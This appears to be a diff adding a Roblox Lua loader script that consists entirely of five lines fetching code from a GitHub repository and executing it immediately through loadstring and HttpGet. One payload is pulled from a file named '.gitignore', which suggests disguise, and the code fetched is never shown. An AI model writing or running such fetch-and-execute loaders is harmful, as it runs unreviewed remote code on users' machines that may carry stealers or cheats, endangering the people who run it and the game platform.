@@ -1,0 +1,9 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconNobYT/CustomScript/main/Key"))()
+
+loadstring(game:HttpGet("https://github.com/BaconNobYT/CustomScript/raw/main/.gitignore"))()
+
+loadstring(game:HttpGet("https://github.com/BaconNobYT/CustomScript/raw/main/AntiVoid"))()
+
+loadstring(game:HttpGet("https://github.com/BaconNobYT/CustomScript/raw/main/Custom%20thing"))()
+
+loadstring(game:HttpGet("https://github.com/BaconNobYT/CustomScript/raw/main/CustomThing2"))()
